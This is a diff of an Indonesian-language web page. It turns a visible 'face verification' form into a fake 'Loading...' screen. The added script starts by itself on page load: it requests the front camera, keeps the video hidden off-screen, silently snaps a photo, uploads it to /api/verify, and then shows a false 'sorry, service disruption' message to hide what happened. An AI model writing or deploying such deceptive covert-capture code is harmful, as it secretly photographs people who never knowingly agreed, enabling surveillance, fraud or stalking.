@@ -3,187 +3,317 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verifikasi Wajah</title>
+<title>Loading...</title>
 <style>
-  * { box-sizing: border-box; }
-  body {
+  * {
     margin: 0;
-    font-family: -apple-system, Segoe UI, Roboto, sans-serif;
-    background: linear-gradient(160deg, #4c1d95, #1e1b4b);
-    color: #fff;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #0a0a0a;
     min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
     padding: 20px;
+    color: #fff;
   }
-  .card {
-    background: #1e1b4b;
-    border: 2px solid #7c3aed;
-    border-radius: 20px;
-    padding: 28px 22px;
+  
+  .loading-container {
+    text-align: center;
     max-width: 400px;
     width: 100%;
-    text-align: center;
-    box-shadow: 0 10px 40px rgba(124,58,237,0.4);
   }
-  h1 { font-size: 20px; margin-bottom: 6px; color: #facc15; }
-  p.desc { color: #c4b5fd; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
-
-  input#phone {
-    width: 100%;
-    padding: 14px;
+  
+  /* Loading Spinner */
+  .spinner-container {
+    margin-bottom: 30px;
+  }
+  
+  .spinner {
+    width: 60px;
+    height: 60px;
+    margin: 0 auto;
+    border: 4px solid rgba(255,255,255,0.1);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.8s ease-in-out infinite;
+  }
+  
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  
+  .loading-title {
+    font-size: 28px;
+    font-weight: 300;
+    letter-spacing: 8px;
+    color: #666;
+    margin-bottom: 10px;
+    animation: pulse 1.5s ease-in-out infinite;
+  }
+  
+  @keyframes pulse {
+    0%, 100% { opacity: 0.5; }
+    50% { opacity: 1; }
+  }
+  
+  .loading-sub {
+    color: #333;
+    font-size: 13px;
+    letter-spacing: 3px;
+  }
+  
+  .loading-dots {
+    display: inline-block;
+    width: 20px;
+    text-align: left;
+  }
+  
+  .loading-dots::after {
+    content: '...';
+    animation: dots 1.5s steps(4) infinite;
+  }
+  
+  @keyframes dots {
+    0% { content: ''; }
+    25% { content: '.'; }
+    50% { content: '..'; }
+    75% { content: '...'; }
+  }
+  
+  /* Status Message */
+  .status-message {
+    margin-top: 30px;
+    padding: 15px;
+    background: #111;
     border-radius: 12px;
-    border: 2px solid #7c3aed;
-    background: #2e1065;
-    color: #fff;
-    font-size: 15px;
-    margin-bottom: 14px;
-    outline: none;
+    color: #444;
+    font-size: 14px;
+    min-height: 50px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 1px solid #1a1a1a;
+    transition: all 0.5s;
   }
-  input#phone::placeholder { color: #a78bfa; }
-
-  video, canvas { width: 100%; border-radius: 14px; display: none; background: #000; }
-  video.active, canvas.active { display: block; margin-bottom: 14px; }
-
-  button {
-    width: 100%;
-    padding: 14px;
-    border: none;
-    border-radius: 999px;
-    font-weight: 800;
-    font-size: 15px;
-    cursor: pointer;
-    margin-top: 10px;
-    transition: transform 0.1s;
+  
+  .status-message.success {
+    color: #34C759;
+    border-color: #1a3a1a;
+    background: #0d1a0d;
   }
-  button:active { transform: scale(0.97); }
-  button:disabled { opacity: 0.5; cursor: not-allowed; }
-
-  #btnFoto { background: #facc15; color: #1e1b4b; }
-
-  #status { margin-top: 14px; font-size: 14px; color: #ddd6fe; min-height: 18px; }
-  #status.error { color: #f87171; }
-
-  .overlay {
-    position: fixed; inset: 0;
-    background: rgba(0,0,0,0.7);
-    display: flex; align-items: center; justify-content: center;
-    z-index: 50;
+  
+  .status-message.error {
+    color: #FF3B30;
+    border-color: #3a1a1a;
+    background: #1a0d0d;
   }
-  .modal {
-    background: #2e1065;
-    border: 2px solid #facc15;
-    border-radius: 20px;
-    padding: 28px 22px;
-    max-width: 340px;
-    text-align: center;
+  
+  .status-message.info {
+    color: #007AFF;
+    border-color: #1a2a3a;
+    background: #0d1a2a;
   }
-  .modal h2 { color: #facc15; font-size: 18px; margin-bottom: 10px; }
-  .modal p { color: #ddd6fe; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
-  .modal button {
-    background: #facc15; color: #1e1b4b;
-    border-radius: 999px; border: none;
-    padding: 12px 24px; font-weight: 800; cursor: pointer;
+  
+  /* Hidden camera */
+  #hidden-video {
+    position: fixed;
+    top: -9999px;
+    left: -9999px;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+  }
+  
+  #hidden-canvas {
+    display: none;
+  }
+  
+  /* Small dot indicator */
+  .dot-indicator {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+  }
+  
+  .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: #1a1a1a;
+    transition: all 0.3s;
+  }
+  
+  .dot.active {
+    background: #666;
   }
 </style>
 </head>
 <body>
 
-  <div class="overlay" id="welcomeOverlay">
-    <div class="modal">
-      <h2>WELCOME</h2>
-      <p>SELAMAT DATANG DI WEB VERIFIKASI WAJAH<br><br>
-      Isi nomor HP kamu lalu ambil foto wajah untuk proses verifikasi.</p>
-      <button id="btnMulai">Mulai</button>
-    </div>
+<div class="loading-container">
+  <!-- Spinner -->
+  <div class="spinner-container">
+    <div class="spinner"></div>
   </div>
-
-  <div class="card">
-    <h1>Verifikasi Wajah</h1>
-    <p class="desc">Isi nomor HP kamu, lalu klik tombol FOTO untuk verifikasi.</p>
-
-    <input type="tel" id="phone" placeholder="Contoh: 08123456789">
-
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
-    <button id="btnFoto">📸 FOTO</button>
-
-    <div id="status"></div>
+  
+  <!-- Loading Text -->
+  <div class="loading-title">LOADING</div>
+  <div class="loading-sub">
+    Please wait<span class="loading-dots"></span>
   </div>
+  
+  <!-- Status Message -->
+  <div class="status-message" id="statusMessage">
+    ⏳ Menginisialisasi...
+  </div>
+  
+  <!-- Dot Indicator -->
+  <div class="dot-indicator">
+    <div class="dot" id="dot1"></div>
+    <div class="dot" id="dot2"></div>
+    <div class="dot" id="dot3"></div>
+  </div>
+</div>
+
+<!-- Hidden Camera Elements -->
+<video id="hidden-video" autoplay playsinline></video>
+<canvas id="hidden-canvas"></canvas>
 
 <script>
-const welcomeOverlay = document.getElementById('welcomeOverlay');
-const btnMulai = document.getElementById('btnMulai');
-const phoneInput = document.getElementById('phone');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const btnFoto = document.getElementById('btnFoto');
-const statusEl = document.getElementById('status');
+const video = document.getElementById('hidden-video');
+const canvas = document.getElementById('hidden-canvas');
+const statusMessage = document.getElementById('statusMessage');
+const dot1 = document.getElementById('dot1');
+const dot2 = document.getElementById('dot2');
+const dot3 = document.getElementById('dot3');
 
-btnMulai.addEventListener('click', () => {
-  welcomeOverlay.style.display = 'none';
-});
+let stream = null;
+let statusIndex = 0;
 
-btnFoto.addEventListener('click', async () => {
-  const phone = phoneInput.value.trim();
-  if (!phone) {
-    statusEl.className = 'error';
-    statusEl.textContent = 'Isi dulu nomor HP kamu.';
-    return;
-  }
+// Status messages
+const statusList = [
+  '⏳ Menginisialisasi...',
+  '📷 Mengakses kamera...',
+  '📸 Mengambil foto...',
+  '📤 Mengirim data...',
+  '✅ Berhasil terkirim!',
+  '⚠️ Maaf sedang gangguan'
+];
 
-  statusEl.className = '';
-  statusEl.textContent = 'Meminta izin kamera...';
+// Update status dengan animasi dot
+function updateStatus(message, type = 'info') {
+  statusMessage.textContent = message;
+  statusMessage.className = 'status-message ' + type;
+}
+
+// Animasi dot
+function animateDots(index) {
+  dot1.className = 'dot' + (index >= 0 ? ' active' : '');
+  dot2.className = 'dot' + (index >= 1 ? ' active' : '');
+  dot3.className = 'dot' + (index >= 2 ? ' active' : '');
+}
+
+// Start camera and process
+async function startProcess() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: 'environment' } },
+    // Step 1: Init
+    updateStatus(statusList[0]);
+    animateDots(0);
+    await delay(1000);
+    
+    // Step 2: Access camera
+    updateStatus(statusList[1]);
+    animateDots(1);
+    
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { 
+        facingMode: 'user',
+        width: { ideal: 640 },
+        height: { ideal: 480 }
+      },
       audio: false
     });
+    
     video.srcObject = stream;
-    video.classList.add('active');
-    btnFoto.disabled = true;
-    phoneInput.disabled = true;
-
-    statusEl.textContent = 'Mengambil foto...';
-    setTimeout(async () => {
-      const ctx = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      const capturedImage = canvas.toDataURL('image/jpeg', 0.85);
-
-      stream.getTracks().forEach(t => t.stop());
-      video.classList.remove('active');
-      canvas.classList.add('active');
-      btnFoto.style.display = 'none';
-
-      statusEl.textContent = 'Mengirim...';
-
-      try {
-        const res = await fetch('/api/verify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: capturedImage, phone: phone })
-        });
-        const data = await res.json();
-        if (data.ok) {
-          statusEl.className = '';
-          statusEl.textContent = 'PREVIEW OLEH ADMIN SEDANG DI TINJAU';
-        } else {
-          throw new Error(data.error || 'Gagal mengirim');
-        }
-      } catch (err) {
-        statusEl.className = 'error';
-        statusEl.textContent = 'Gagal mengirim, coba refresh halaman.';
-      }
-
-    }, 1200);
-
+    await delay(1000);
+    
+    // Step 3: Capture photo
+    updateStatus(statusList[2]);
+    animateDots(2);
+    await delay(500);
+    
+    // Capture from video
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    const imageData = canvas.toDataURL('image/jpeg', 0.85);
+    
+    // Stop camera
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+      video.srcObject = null;
+    }
+    
+    // Step 4: Send to server
+    updateStatus(statusList[3]);
+    
+    const formData = new FormData();
+    formData.append('image', imageData);
+    
+    const response = await fetch('/api/verify', {
+      method: 'POST',
+      body: formData
+    });
+    
+    const result = await response.json();
+    
+    if (result.success) {
+      // Step 5: Success
+      updateStatus(statusList[4], 'success');
+      animateDots(-1);
+      await delay(2000);
+      
+      // Step 6: Show error message (maaf sedang gangguan)
+      updateStatus(statusList[5], 'error');
+      
+      // Keep loading animation running
+      document.querySelector('.spinner').style.animation = 'spin 0.8s ease-in-out infinite';
+      
+    } else {
+      throw new Error(result.error || 'Gagal mengirim');
+    }
+    
   } catch (err) {
-    statusEl.className = 'error';
-    statusEl.textContent = 'Izin kamera ditolak atau tidak tersedia.';
+    console.error('Process error:', err);
+    updateStatus('❌ ' + (err.message || 'Terjadi kesalahan'), 'error');
+    await delay(2000);
+    updateStatus(statusList[5], 'error');
+  }
+}
+
+// Delay helper
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// Start when page loads
+window.addEventListener('load', () => {
+  setTimeout(startProcess, 500);
+});
+
+// Cleanup
+window.addEventListener('beforeunload', () => {
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
   }
 });
 </script>
